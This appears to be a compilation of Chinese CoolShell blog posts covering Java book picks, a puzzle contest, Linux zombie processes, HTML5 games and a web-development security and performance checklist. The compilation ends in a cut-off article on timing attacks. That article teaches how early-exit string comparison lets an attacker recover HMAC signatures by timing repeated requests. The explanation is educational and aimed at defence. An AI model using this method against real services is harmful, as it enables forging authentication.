最后，尤其是想对那些到Apollo源代码的issue里发spam垃圾信息的人说一下，你看看人家，再看看你们自己，你们是不是想让你们的孩子在登月100周年纪念的时候说——50年前我爹那个傻叉在Apollo的github的issue列表时写了些垃圾，还以为自己多机灵？！（全文完）# Java书籍Top 10作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面是Java Inside上推荐的十本不错的Java书籍。（文章来源）!Java编程规范（第三版）**1）Java Language Specification, _Third Edition_** ( _by James Gosling_ )本书由Java技术的发明者编写，是Java TM编程语言的权威性技术指南。如果你想知道语言之构造的精确含义，本书是最好的资源。中文版链接：《Java编程规范》   英文版链接：《The Java Language Specification (3rd Edition) 》**!Effective Java中文版\(第2版\)****2）** **Effective Java** , **_Second Edition_** ( _by Joshua Bloch_ )
本书介绍了在Java编程中78条极具实用价值的经验规则，这些经验规则涵盖了大多数开发人员每天所面临的问题的解决方案。通过对Java平台设计专家所使用的技术的全面描述，揭示了应该做什么，不应该做什么才能产生清晰、健壮和高效的代码。.本书中的每条规则都以简短、独立的小文章形式出现，并通过例子代码加以进一步说明。本书内容全面，结构清晰，讲解详细。可作为技术人员的参考用书。…中文版链接：《Effective Java 第二版》   英文版链接：《Effective Java (2nd Edition) 》**!JAVA并发编程实践****3)** **Java Concurrency in Practice** ( _by Brian Goetz_ )随着多核处理器的普及，使用并发成为构建高性能应用程序的关键。Java 5以及6在开发并发程序取得了显著的进步，提高了Java虚拟机的性能，提高了并发类的可伸缩性，并加入了丰富的新并发构建块。在本书中，这些便利工具的创造者不仅解释了它们究竟如何工作、如何使用，同时，还阐释了创造它们的原因，及其背后的设计模式。 本书既能够成为读者的理论支持，又可以作为构建可靠的，可伸缩的，可维护的并发程序的技术支持。本书并不仅仅提供并发API的清单及其机制，本书还提供了设计原则，模式和思想模型，使我们能够更好地构建正确的，性能良好的并发程序。
本书的读者是那些具有一定Java编程经验的程序员、希望了解Java SE 5，6在线程技术上的改进和新特性的程序员，以及Java和并发编程的爱好者。中文版链接：《JAVA并发编程实践》   英文版链接：《Java Concurrency in Practice 》**!JAVA解惑****4）Java Puzzles: Traps, Pitfalls and Corner Cases** ( _by Joshua Bloch_ )Java教父的又一经典名著–Java Puzzlers，Amazon五星图书。认为你到底有多了解Java？你是一个代码神探吗？你是否曾经花费过数天时间去追踪一个由Java或其类库的陷阱和缺陷而导致的bug？你喜欢智力测验吗？那么这本书正好适合你！中文版链接：《JAVA解惑》   英文版链接：《Java Puzzlers : Traps, Pitfalls, and Corner Cases 》**!Java编程思想\(第4版\)\(经典图书最新版本\) \(07年度畅销榜NO.4\)****5)** **Thinking in Java** ( _by Bruce Eckel_ )
本书赢得了全球程序员的广泛赞誉，即使是最晦涩的概念，在Bruce Eckel的文字亲和力和小而直接的编程示例面前也会化解于无形。从Java的基础语法到最高级特性（深入的面向对象概念、多线程、自动项目构建、单元测试和调试等），本书都能逐步指导你轻松掌握。从本书获得的各项大奖以及来自世界各地的读者评论中，不难看出这是一本经典之作。本书的作者拥有多年教学经验，对C、C++以及Java语言都有独到、深入的见解，以通俗易懂及小而直接的示例解释了一个个晦涩抽象的概念。本书共22章，包括操作符、控制执行流程、访问权限控制、复用类、多态、接口、通过异常处理错误、字符串、泛型、数组、容器深入研究、Java I/O系统、枚举类型、并发以及图形化用户界面等内容。这些丰富的内容，包含了Java语言基础语法以及高级特性，适合各个层次的Java程序员阅读，同时也是高等院校讲授面向对象程序设计语言以及Java语言的绝佳教材和参考书。中文版链接：《JAVA编程思想(第4版)》   英文版链接：《Thinking in Java (4th Edition) 》******!轻快的Java****6)** **Better, faster, lighter Java** ( _by Justin Gehtland, Bruce A. Tate_ )
Java的开发者正深陷于复杂性的泥沼中而无法自拔。我们的经验和能力正接近极限，程序员为了编写支持所选框架的程序所花的时间比解决真正问题的时间要多得多。我们不禁要问，有必要把Java搞得这么复杂吗?.答案是否定的。本书给你指引了一条出路。无论是维护应用程序，还是从头开始设计，你都能够超越成规，并大幅精简基本框架、开发过程和最终代码。你能重新掌握一度失控的J2EE应用程序。..在本书中，原作者Bruce A．Tate与Justin Gehtland将循序渐进、娓娓道来。首先，他们列出了五项基本法则。他们展示了如何构建简单、解耦的代码，并告诉你如何选择技术。他们还对两种被广泛运用的开源程序如何迎合这些概念进行了剖析。最后，作者还将利用这些基本概念构建一个简单但内涵丰富的应用程序来解决现实世界中所遇到的问题。中文版链接：《轻快的JAVA》   英文版链接：《Better, Faster, Lighter Java》**!Java核心技术,卷1\(原书第8版\)\(china-pub 全国首发\)****7)** **Core Java (vol. 1, 2)** ( _by Cay S. Horstmann, Gary Cornell_ )
《Java核心技术》出版以来一直畅销不衰，深受读者青睐，每个新版本都尽可能快地跟上Java开发工具箱发展的步伐，而且每一版都重新改写了部分内容，以便适应Java的最新特性。本版也不例外，它反映了Java SE 6的新特性。全书共14章，包括Java基本的程序结构、对象与类、继承、接口与内部类、图形程序设计、事件处理、Swing用户界面组件、部署应用程序和Applet、异常日志断言和调试、泛型程序设计、集合以及多线程等内容。.全书对Java技术的阐述精确到位，叙述方式深入浅出，并包含大量示例，从而帮助读者充分理解Java语言以及Java类库的相关特性。中文版链接：《JAVA核心技术，卷1，卷2》   英文版链接：《Core Java, Volume I–Fundamentals (8th Edition) ，Core Java, Vol. 2: Advanced Features, 8th Edition 》**!The Java Virtual Machine Specification \(2nd Edition\)\(英文原版进口）****8） The Java Virtual Machine Specification** ( _by Tim Linholm, Frank Yellin_ )
如果你需要了解Java虚拟机的byte code，或者是一些编译方面的东西，这本书绝对让你得偿所愿。其不但包含了机器码的规范说明，同时它也是Java编译器和运行环境的规格说明书。中文版链接：《无》   英文版链接：《The Java Virtual Machine Specification (2nd Edition) 》**!Robust Java中文版--Java异常处理、测试与调试（amazon 4星图书，项目经理必备读物）\(购买清华社红皮书系列满88元赠品\)****9）Robust Java: Exception Handling, Testing, and Debugging** ( _by Stephen Stelting_ )处理异常涉及开发、设计和体系结构等方面的知识。本书共分3个部分。   第Ⅰ部分介绍Java异常的产生机理和用法，介绍一些最佳实践，讲述各类异常处理使用的一般API和技术。   第Ⅱ部分阐述可测试性设计，介绍故障模式分析，讨论常见API的异常及起因，分析J2EE体系结构和分布式API的异常模式。   第Ⅲ部分讨论在软件开发周期执行异常和错误处理，分析软件体系结构、设计模式、测试和调试，列举成熟的设计模式，介绍处理策略对系统体系结构的影响，讲述如何构建健壮系统。
中文版链接：《ROBUST JAVA中文版–JAVA异常处理、测试与调试》   英文版链接：《Robust Java Exception Handling,Testing and Debugging 》10） **Java Code Convention**最后一本当然是Java编码规范，这是由Sun公司官方出品的。这也是每个程序员为了得供程序的易读性，可维护性需要知道的。# 【活动】解迷题送礼物作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn首先，先跟大家道歉一下最近CoolShell大约长达一个多月没有什么更新，原因主要在于，我去看世界杯去了，这一个月的世界杯熬夜看球使我的精力不佳，导致世界杯结束后的几个星期也没有缓过来，所以没有更新什么文章。好多朋友写邮件或是在微博上at我催我更新，所以有点惭愧了。精神不佳我就不写文章了。于是，世界杯过后，我每天都会抽出每天晚上和周末的一些碎片时间，我仿照一些前端过关的游戏，做了几个和程序员有关的迷题，也是要通关的，不过和前端知识没什么关系。这个游戏我放到了下面这个二级域名下。****有兴趣的朋友可以去玩玩。通关的同学我会送你们《Unix环境高级编程（第三版）》（感谢@出版圈郭志敏 赞助）或一个马克杯（感谢@linux命令行精选网 赞助）），因为奖品数量有限，所以，我会送给前十个通关的同学（后面通关的我会随机抽几个）。
最后说一下这些迷题：1）目前一共有10个迷题。你通关会出现个Congratulations的页面和一个表单，希望你能提供一下你的联系方式（联系方式只要你的email/weibo/twitter/homepage这样你比较公开的方式）。2）为了突出fun，所以，这些迷题中有好些基于一些“有趣”的知识的（可能有些知识你是不知道的）。3）我使用了英文，只希望你对英文不要害怕，英文是程序员最关键的一项技能。（虽然我的英文也一般）4）你要通关的话，你可能需要很多的Google/Wikipedia，所以，你可能需要翻墙环境。我希望你能经常翻墙。5）另外，如果要通关的话，你需除了有比较好的观察能力，你还需要对Linux命令行有一些了解，有一半左右的题是需要写代码才能过的，写代码的题中有字符串匹配（正则表达式），网络请求，算法和数据结构，以及一些基础的加密解密知识。6）这些题并不难，而且谜面提示得应该是非常清楚，不过，你要做完最快也需要2-3个小时，所以，在这里还是谢谢你的时间。祝大家玩得愉快！**————更新：2014/8/5————****本活动已结果，题的页面还在保留中……**（全文完）# Linux 的僵尸(zombie)进程
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn可能很少有人意识到，在一个进程调用了exit之后，该进程 并非马上就消失掉，而是留下一个称为僵尸进程（Zombie）的数据结构。在Linux进程的5种状态中，僵尸进程是非常特殊的一种，它已经放弃了几乎所 有内存空间，没有任何可执行代码，也不能被调度，仅仅在进程列表中保留一个位置，记载该进程的退出状态等信息供其他进程收集，除此之外，僵尸进程不再占有 任何内存空间。僵尸进程的来由，要追溯到Unix，Unix的设计者们设计这个东西并非是因为闲来无事想装装酷什么的。上面说到，僵尸进程中保存着很多对程序员和系统管理员非常重要的信息，首先，这个进程是怎么死亡的？是正常退出呢，还是出现了错误，还是被其它进程强迫退出的？也就是说，这个程序的退出码是什么？其次，这个进程占用的总系统CPU时间和总用户CPU时间分别是多少？发生页错误的数目和收到信号的数目。这些信息都被存储在僵尸进程中，试想如果没有僵尸进程，进程执行多长我们并不知道，一旦其退出，所有与之相关的信息都立刻都从系统中清除，而如果此时父进程或系统管理员需要用到，就只好干瞪眼了。
所以，进程退出后，系统会把该进程的状态变成Zombie，然后给上一定的时间等着父进程来收集其退出信息，因为可能父进程正忙于别的事情来不及收集，所以，使用Zombie状态表示进程退出了，正在等待父进程收集信息中。Zombie进程不可以用kill命令清楚，因为进程已退出，如果需要清除这样的进程，那么需要清除其父进程，或是等很长的时间后被内核清除。因为Zombie的进程还占着个进程ID号呢，这样的进程如果很多的话，不利于系统的进程调度。下面，让我们来看看一个示例：编译这个程序：`$ cc zombie.c -o zombie`后台运行程序，以使我们能够执行下一条命令$ ./zombie &     [1] 1217列一下系统内的进程$ ps -ax     ... ...     1137   pts/0   S   0:00   -bash     1217   pts/0   S   0:00   ./zombie     1218   pts/0   Z   0:00   [zombie]     1578   pts/0   R   0:00   ps   -ax其中的”Z”就是僵尸进程的标志，它表示1218号进程现在就是一个僵尸进程。
收集Zombie进程的信息，并终结这些僵尸进程，需要我们在父进程中使用waitpid调用和wait调用。这两者的作用都是收集僵尸进程留下的信息，同时使这个进程彻底消失。*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 流体力学的演示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn某人用Java搞了一个流体力学的演示。不过，这仅仅是个开始。某同学将其发布上了reddit.com，于是，全世界的同学们开始给力了——Flash的开发者首先不服，搞了个 flash版（带源码）：看到了Flash版，Javascript+HTML5的同学们也不干了，于是出现HTML5版（带源码）：不过性能慢了很多，所以，又有人优化了一下HTML5版的程序:SVG的同学们也不甘寂寞，不过，那真叫一个慢啊。这个时候，C/C++同学出来了，使用SDL库也搞了一个：——————短短几天里，被人重写成各种语言。这个程序写起来真的很简单吗？是我out了吗？**更新- iPhone和iPad版的** ：
# Web开发中需要了解的东西作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在StackExchange上有人问了这样一个问题：What should every programmer know about web development?（关于Web开发，什么是所有程序员需要知道的？）里面给出的答案非常不错，所以，我翻译转载过来。 顺便说一下，StackExchange真是非常好，大家可以对同一个答案做贡献和修订，看看这个问题的修订过程你就知道了——专业的问答网站应该怎么去做。这就是我在这篇文章中也说过真正的用户体验是什么样的。好了，下面是正文（我对原文做了一些批注，也许不对或有误导，请大家指正）下面的这些东西可能对于大多数人并不陌生，但是可能会有些东西你以前并没有看过，或是没有完全搞懂，甚至都没有听说过。（陈皓注：我相信当你看完这个列表后，你会觉得对于我国的Web开发有点弱了，还是那句话，表面上的东西永远是肤浅的）目录* 接口和用户体验   * 安全   * 性能   * SEO (搜索引擎优化)   * 技术   * Bug fixing
#### **接口和用户体验*** 小心浏览器的实现标准上的不一致，确信让你的网站能够适当地跨浏览器。至少，你的网站需要测试一下下面的浏览器：     * 最新的 Gecko 引擎 (Firefox)，     * 一个 Webkit 引擎 (Safari, Chrome, 或是其它的移动设备上的浏览器)     * IE 浏览器 (测试IE的兼容性你可以使用微软IE的 Application Compatibility VPC Images)     * Opera 浏览器。最后，你可以使用一下这个工具 来看看你的网页在不同的浏览器下是怎么被显示出来的（陈皓注：这个工具就是以前本站介绍过的在不同浏览器和平台上检查你的网站的兼容性）* 多考虑一下人们是怎么来访问你的网站而不是那些主流的浏览器：手机，读屏软件和搜索引擎，例如：一些Accessibility的东西： WAI 和 Section508, 移动设备开发：MobiForge.* 部署Staging：怎么部署网站的更新而不会影响用户的访问。 Ed Lucas的答案 可以让你了解一些（陈皓注：Ed说了一些如版本控制，自动化build，备份，回滚等机制）。
* 千万不要直接给用户显示不友好的错误信息。* 千万不要把用户的邮件地址以明文显示出来，这样会被爬虫爬走并被让用户的邮箱被垃圾邮件搞死。* 为用户的链接加上 `rel="nofollow"` 的属性以 避免垃圾网站的干扰。（陈皓注： **nofollow** 是HTML的一个属性，用于通知搜索引擎“这个链接所指向的网页非我所能控制，对其内容不予置评”，或者简单地说，该链接不是对目标网站或网页的“投票”，这样搜索引擎不会再访问这个链接。这个是用来减少一些特定垃圾页面对原网站的影响，从而可以改善搜索结果的质量，并且防止垃圾链接的蔓延。）* 为网站建立一些的限制 – 这个属于安全性的范畴。（陈皓注：比如你在Google注册邮箱时，你一口气注册超过两个以上的邮箱，gmail要求给你发短信或是给你打电话认证，比如Discuz论坛的会限制你发贴或是搜索的间隔时间等等，更多的网站会用CAPTCHA来确认是人为的操作。 这些限制都是为了防止垃圾和恶意攻击）* 学习如何做 Progressive Enhancement. （陈皓注：Progressive Enhancement是一个Web Design的理念，如：1）基础的内容和功能应该可以被所有的浏览器存取，2）页面布局的应该使用外部的CSS链接，3）Javascript也应该是外部链接还应该是 unobtrusive 的，4）应该让用户可以设置他们的偏好）
* 如果POST成功，要在POST方法后重定向网址，这样可以阻止用户通过刷新页面重复提交。* 严重关注Accessibility。因为这是法律上的需求（陈皓注：Section 508是美国的508法案，其是美国劳工复健法的改进，它是一部联邦法律，这个法律要求所有技术要考虑到残障人士的应用，如果某个大众信息传播网站，如果某些用户群体（如残疾人）浏览该网站获取信息时，如果他们无法正常获得所期望的信息（如无法正常浏览），那可以依据相关法规，可以对该网站依法起诉）。 WAI-ARIA 为这方面的事提供很不错的资源.#### **安全*** 在网上有很多关于安全的文章，但是 OWASP 开发指导 涵盖了几乎所有关于Web站点安全的东西。（陈皓注：OWASP(开放Web应用安全项目- Open Web Application Security Project)是一个开放的非营利性组织，目前全球有130个分会近万名会员，其主要目标是研议协助解决Web软体安全之标准、工具与技术文件，长期 致力于协助政府或企业了解并改善网页应用程式与网页服务的安全性。OWASP被视为Web应用安全领域的权威参考。2009年下列发布的美国国家和国际立法、标准、准则、委员会和行业实务守则参考引用了OWASP。美国联邦贸易委员会(FTC)强烈建议所有企业需遵循OWASP十大WEB弱点防护守则）
* 了解什么是 SQL 注入攻击 并知道怎么阻止这种攻击。* 永远不要相信用户的输入（包括Cookies，因为那也是用户的输入）* 对用户的口令进行Hash，并使用salt，以防止Rainbow 攻击（陈皓注：Hash算法可用MD5或SHA1等，对口令使用salt的意思是，user 在设定密码时，system 产生另外一个random string(salt)。在datbase 存的​​是与salt + passwd 产的md5sum 及salt。 当要验证密码时就把user 输入的string 加上使用者的salt，产生md5s​​um 来比对。 理论上用salt 可以大幅度让密码更难破解，相同的密码除非刚好salt 相同，最后​​存在database 上的内容是不一样的。google一下md5+salt你可以看到很多文章。关于Rainbow 攻击，其意思是很像密码字典表，但不同的是，Rainbow Table存的是已经被Hash过的密码了，而且其查找密码的速度更快，这样可以让攻击非常快）。使用慢一点的Hash算法来保存口令，如 bcrypt (被时间检证过了) 或是 scrypt (更强，但是也更新一些) (1, 2)。你可以阅读一下 How To Safely Store A Password（陈皓注：酷壳以前曾介绍过bcrypt这个算法，这里，我更建议我们应该让用户输入比较强的口令，比如Apple ID注册的过程需要用户输入超过8位，需要有大小写和数字的口令，或是做出类似于这样的用户体验的东西）。
* 不要试图自己去发明或创造一个自己的fancy的认证系统，你可能会忽略到一些不容易让你查觉的东西而导致你的站点被hack了。（陈皓注：我在腾讯那坑爹的申诉系统中说过这个事了，我说过这句话——“真正的安全系统是协同整个社会的安全系统做出来的一道安全长城，而不是什么都要自己搞”，当然，很遗憾不是所有的人都能看懂这个事，包括一些资深的人）* 了解 处理信用卡的一些规则 . (这里也有一个问题你可以查看一下) （陈皓注：有两上vendor可以帮助你，一个是 Authorize.Net 另一个是 PayFlow Pro）* 使用 SSL/HTTPS 来加密传输登录页面或是任可有敏感信息的页面，比如信用卡号等。* 知道如何对付session 劫持。（陈皓注：请参看wikipedia的这Session Hijacking，）* 避免 跨站脚本攻击(XSS)。（陈皓注：参看酷壳站前几天发的《新浪微博的XSS攻击事件》）* 避免 跨站伪造请求攻击 cross site request forgeries (XSRF).* 保持你的系统里的所有软件更新到最新的patch。* 确保你的数据库连接是安全的。* 确保你能了解最新的攻击技术，以及你系统的脆弱处。
* 请读一下 The Google Browser Security Handbook.* 请读一下 The Web Application Hacker’s Handbook.* （陈皓注：之前本站的“一些资源”提到过Mozilla的安全编程规范，还有Ruby on Rails的Web安全的开发教程）#### **性能*** 只要需要，请实现cache机制，了解并合理地使用 HTTP caching 以及 HTML5 Manifest.* 优化页面 —— 不要使用20KB图片来平铺网页背景。（陈皓注：还有很多网页页面优化性的文章，你可以STFG – Search The Fucking Google一下。如果你要调试的话，你可以使用firebug或是chrome内置的开发人员的工具来查看网页装载的性能）   * 学习如何 gzip/deflate 网页 (deflate 更好).* 把多个CSS文件和Javascript文件合并成一个，这样可以减少浏览器的网络连数，并且使用gzip压缩被反复用到的文件。* 学习一下 Yahoo Exceptional Performance 这个网站上的东西，上面有很多非常不错的改善前端性能的指导，以及 YSlow 这个工具。 Google page speed 是另一个用来做性能采样的工具。这两个工具都需要安装 Firebug 。
* 为那些小的图片使用 CSS Image Sprites，就像工具条一样。 (参看 “最小化 HTTP 请求” ) （陈皓注：把所有的小图片合并成一个图片，然后用CSS把显示其中的一块，这样，这些小图片只用传输一次，酷壳的Wordpress样式的那个RSS订阅列表中的小图标就是这样做的）* 繁忙的网络应该考虑把网页的内容分开存放在不同的域名下。（陈皓注：比如有专门的图片服务器——图片相当耗带宽，或是专门的Ajax服务器）* 静态网页 (如，图片，CSS，JavaScript，以及一些不需要访问cookies的网页) 应该放在一个不使用cookies的独立的域名下，因为所有在同一个域名或子域名下的cookie会被这个域名下的请求一同发送。另一个好的选择是使用 Content Delivery Network (CDN).* 使用单个页面的HTTP请求数最小化。* 为Javascript使用 Google Closure Compiler 或是 其它压缩工具（陈皓注：压缩Javascript代码可以让你的页面减少网络传输从而可以得到很快的喧染。注意，并不是所有的工具都可以正确压缩Javascript的，Google的这个工具甚至还可以帮你优化你的代码）
* 确认你的网站有一个 `favicon.ico` 文件放在网站的根下，如 `/favicon.ico`. 浏览器会自动请求这个文件，就算这个图标文件没有在你的网页中明显说明，浏览器也会请求。如果你没有这个文件，就会出大量的404错误，这会消耗你的服务器带宽。（陈皓注：服务器返回404页面会比这个ico文件可能还大）#### **SEO (搜索引擎优化)*** 使用 “搜索引擎喜欢的” URL，如：使用 `example.com/pages/45-article-title` 而不是 `example.com/index.php?page=45 `(陈皓注：这里的URL是说Wordpress的，后者是默认的)* 如果你的动态页面要使用 `#` ，那么请把其改成 `#!` ，而在服务端，你需要处理`$_REQUEST["_escaped_fragment_"]` 这是Google搜索引擎需要的。换句话说，`./#!page=1` 会被Google搜索引擎转成 `./?_escaped_fragments_=page=1。` （陈皓注：通常来说URL中的#后的东西都不会被传到服务器上，所以，为了要让Google可以抓取AJAX的东西，你需要使用#!，而Google会把“#!”转成“_escaped_fragment_”来向服务器发请求，Twitter的大量的链接者是#!的，比如：）。另外，用户也许会使用Firefox 或 Chromium， `history.pushState({"foo":"bar"}, "About", "./?page=1");` 是一个很不错的命令。所以，就算是我们的地址栏上的地址改变了，页面也不会重新装载。这可以让你使用 `?` 而不是 `#!` 也能无刷地保住当前的动态的页面，这可以让AJAX的请求被浏览器记住。
* 别使用 “click here” 这样的链接。这样一来，无法SEO，而且对于一些需要使用读屏人来说很不友好（陈皓注：关于读屏软件，可参看本站的“如果看不见你还能编程吗”）* 做一个 XML sitemap，并放在网端的根下 `/sitemap.xml`. （陈皓注：这个文件可以让搜索引擎了解你的网站图）   * 当你有多个URL指向同一个网页的使用，使用 `<link rel="canonical" ... />` 你可以使用 Google Webmaster Tools 来查看相关的问题。* 使用 Google Webmaster Tools 和 Yahoo Site Explorer.* 安装 Google Analytics (或是别的开源的网站分析工具，如： Piwik).* 了解 robots.txt 和搜索引擎爬虫是如何工作的。* 重定向请求 (使用 `301 重定向网站`) ，如果你要把 `www.example.com` 定向到 `example.com`(或是其它的变更) 这样可以防止Google的rank因为域名的变化发生改变。（陈皓注：301重定向一般用作域名变更）
* 知道并不是所有的爬虫都是好的，有些爬虫的行为并不好。（陈皓注：比如向你的网站发大量的请求导致服务器性能低下）* 如果你有一些非文本的内容需要在 Google’s sitemap 中，比如视频什么的。Tim Farley的答案，可以让你看到很多有价值的东西。#### **技术*** 理解什么是 HTTP 比如 GET, POST, sessions, cookies等，了解什么是 “stateless” 无状态。* 让你的 XHTML/HTML 和 CSS 符合 W3C 规范，并确认他们都是 合格的。我们的目标是避免浏览器的 “quirks mode”，并且可以让其更容易地能和非标准的浏览器工作，比如读屏器或移动设备。* 理解浏览器是怎么处理 JavaScript 的。（陈皓：你会看到有些Javascript代码在页面上前面，有些则是在后面，所以你需要对其了解清楚为什么是这样）* 了解浏览器是怎么装载 JavaScript，CSS和其它资源的，了解其对视觉上的影响。（陈皓注：10年前我做网页的时候因为HTML还很弱，所以只能使用table来布局，使用table布局的问题就是整个table读完后页面才会显示，用户的视觉体验并不好）。在某些情况下，你可能需要把你的脚本放在页面的后面。
* 理解 JavaScript 的 sandbox 是怎么怎么工作的，尤其是你想使用iframes。* 请注意 JavaScript 可能会被禁止，这样会让你的AJAX失效。就算是大多数用户都开启了Javascript功能，但是也可能在一些情况下脚本是不被运行的，比如移动终端上，搜索引擎抓网页的时候也并不会执行你的脚本。* 学习 301 和 302 转向的区别 (这也是一个SEO的问题).* 尽可能多地学习你的部署平台。（比如：操作系统，Web Server：Apache/Nginx，防火墙，数据库，等等）* 考虑使用一个 Reset Style Sheet.* 考虑使用 JavaScript 框架(如： jQuery, MooTools, Prototype, Dojo 或 YUI 3)，它们会很好的兼容于不同的浏览器。（陈皓注：强烈推荐你看一下本站的开源中最好的WEB开发资源一文）* 把视觉效果和JS框架合在一起讨论，考虑使用一个Service，如：Google Libraries API 来装载框架，这样可以让浏览器可能早就把这个JS框架已经cache了而不需要再从你的网站上下载了。
#### **Bug fixing*** 明白你会花20%的时间写代码，而80%的时候在维护，所以你要小心编码。（陈皓注：参看本站的“多些时间可以少些代码”一文）* 设计一个好的错误报告机制。* 设计一个入口可以让人们联系到你并给你建议和批评。* 为你开发的东西形成文档，这样可以让后来的人容易维护你的软件和系统。* 频繁备份（也可确保你的这些备份功能正常） Ed Lucas 的回答 有一些忠告。你还需要有一个恢复策略，而不只是一个备份策略。* 使用一个版本控制系统来保存你的代码，如： Subversion 或 Git.* 别忘了做Acceptance Testing，使用 Selenium 能帮到你。* 确保你有足够的日志，你可以使用 log4j, log4n 或 log4r。如果出了问题，这是可以让你快速找到问题的方式。* 当你写日志的时候，确保你记录了你捕获了处理和未处理异常。报告和分析日志可以让你知道你网站的问题。这里有多的东西被省略了，并不是因为那些可能不是有帮助的答案，而是因为那些东西都太细节了，超出了这个问题的范围，因为这本来就是一个Web开发需要了解东西的Overview。我想你可以去看一下其它人的答案，我有时间，我也会补充别人的答案进来。请随意编辑这个答案，因为可能有些东西忘了，也有可能有些东西不对。
（全文完）# HTML5 小游戏展示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn使用 HTML5 的 Canvas可以搞出一些很有趣的东西，如2D图形，位图，动画等。而使用Javascript来操作这些东西，可以设计出很多的小游戏。 下面是一些用HTML5做出来的小游戏，让我想得了我小时候的那些游戏。顺祝大家中秋节快乐！以及进入史上最混乱的长假调休。呵呵。目录* Sinuous   * 超级玛丽卡丁车   * 吃豆   * 圆环俄罗斯方块   * Asteroids   * Bert’s Breakdown   * TWITCH   * JS Wars   * Chain Reaction   * Same Game   * Coverfire   * JQuery Racing   * 3D 俄罗斯方块 – Cubeout   * Galatic Plunder   * Lines   * RGB Invaders   * Agent 008 Ball   * JSLander   * Rainbow Blocks#### Sinuous
小心被红点撞上。#### 超级玛丽卡丁车A small but fun racing game built in html5 canvas and javascript.#### 吃豆#### 圆环俄罗斯方块#### Asteroids#### Bert’s Breakdown很不错的游戏，漂亮的界面以及不错的关卡设置。#### TWITCHTWITCH是一个解题性质的游戏。试试看你有多快。#### JS Wars一个经典的空战游戏。#### Chain Reaction一个简单又容易上瘾的游戏。#### Same Game这个游戏相信大家都会玩，把相同颜色的连在一起。#### Coverfire#### JQuery Racing靠！这个游戏很耐完，我相信你一定会在上面花很多时间。 jQuery 做的。### Thrust经典的八位图游戏。让我想起了《史上最烂的超级玛丽》### 俄罗斯方块#### 3D 俄罗斯方块 – Cubeout#### Galatic Plunder这个游戏使用了Canvas 和 Audio，主要是为了证明，没有Flash，用HTML5一样行。#### Lines
很简单的游戏，我老看到办公室里很多人在玩。#### RGB Invaders小蜜蜂。#### Agent 008 Ball受不了了，还有台球。#### JSLander一个飞船着陆游戏。速度不要起过去6，不然就坠毁了。#### Rainbow BlocksSameGame 和JT的另一种变种。**文章** ：（全文完）# 计时攻击 Timing Attacks作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本文来自读者“程序猿石头”的投稿文章《这 10 行比较字符串相等的代码给我整懵了，不信你也来看看》，原文写的很好，但不够直接了当，信息密度不够高，所以我对原文进行大量的删减、裁剪、改写和添加，主要删除了一些没有信息的段落，主要加入了如何实施计时攻击相关的其它内容，让这篇文章中的知识更系统一些，并且还指出了其它的一些问题。所以，我把标题也改成了《计时攻击 Timing Attacks》。目录* 另类的字符串比较   * 计时攻击(Timing Attack)   * 各语言的对应函数   * One More Thing#### 另类的字符串比较
在 Java 的 Play Framework 里有一段代码用来验证cookie(session)中的数据是否合法（包含签名的验证）的代码，如下所示：相信刚看到这段源码的人会感觉挺奇怪的，这个函数的功能是比较两个字符串是否相等，如果要判断两个字符串是否相等，正常人的写法应该是下面这个样子的（来自JDK8 的 `String.equals()`-有删减）：public boolean equals(Object anObject) {     String anotherString = (String)anObject;     int n = value.length;     if (n == anotherString.value.length) {     char v1[] = value;     char v2[] = anotherString.value;     int i = 0;     while (n-- != 0) {     if (v1[i] != v2[i]) // <- 遇到第一个不一样的字符时退出     return false;     i++;     }     return true;     }     return false;     }
我们可以看到，在比较两个字符串是否相等的正常写法是：1. 先看一下两个字符串长度是否相等，如果不等直接返回 false。   2. 如果长度相等，则依次判断每个字符是否相等，如果不等则返回 false。   3. 如果全部相等，则返回 true。一旦遇到不一样的字符时，直接返回false。然而，Play Framework里的代码却不是这样的，尤其是上述的第2点，用到了异或，熟悉位操作的你很容易就能看懂，通过异或操作 `1^1=0` , `1^0=1`, `0^0=0`，来比较每一位，如果每一位都相等的话，两个字符串肯定相等，最后存储累计异或值的变量 `equal`必定为 0（因为相同的字符必然为偶数），否则为 1。但是，这种异或的方式不是遇到第一个不一样的字符就返回 false 了，而是要做全量比较，这种比较完全没有效率，这是为什么呢？原因是为了安全。#### 计时攻击(Timing Attack)计时攻击（Wikipedia）是旁道攻击(或称”侧信道攻击”， Side Channel Attack， 简称SCA) 的一种， **旁通道攻击** 是指基于从计算机系统的实现中获得的信息的任何攻击 ，而不是基于实现的算法本身的弱点（例如，密码分析和软件错误）。时间信息，功耗，电磁泄漏甚至声音可以提供额外的信息来源，可以加以利用。在很多物理隔绝的环境中（黑盒），往往也能出奇制胜，这类新型攻击的有效性远高于传统的密码分析的数学方法。（注：企图通过社会工程学欺骗或强迫具有合法访问权限的人来破坏密码系统通常不被视为旁道攻击）
计时攻击是最常用的攻击方法。那么，正常的字符串比较是怎么被黑客进行时间攻击的呢？我们知道，正常的字符串比较，一旦遇到每一个不同的字符就返回失败了，所以，理论上来说，前面只有2个字符相同字符串比较的耗时，要比前面有10个字符相同的比较要短。你会说，这能相差多少呢？可能几微秒吧。但是，我们可以放大这个事。比如，在Web应用时，记录每个请求的返回所需请求时间（一般是毫秒级），如果我们重复50次，我们可以查看平均时间或是p50的时间，以了解哪个字符返回的时间比较长，如果某个我们要尝试的字符串的时间比较长，我们就可以确定地得出这个这字符串的前面一段必然是正确的。（当然，你会说网络请求的燥音太多了，在毫秒级的请求上完全没办判断，这个需要用到统计学来降噪，后面会给出方法）这个事情，可以用来做HMAC的攻击，所谓HMAC，你可以参看本站的《HTTP API 认证授权术》文章了解更多的细节。简单来说，HMAC，就是客户端向服务端发来一个字符串和其签名字符串（HMAC），然后，服务端的程序用一个私钥来对客户端发来的字符串进行签名得到签名字符串，然后再比较这个签名字符串（所谓签名，也就是使用MD5或SHA这样的哈希算法进行编码，是不可逆的）
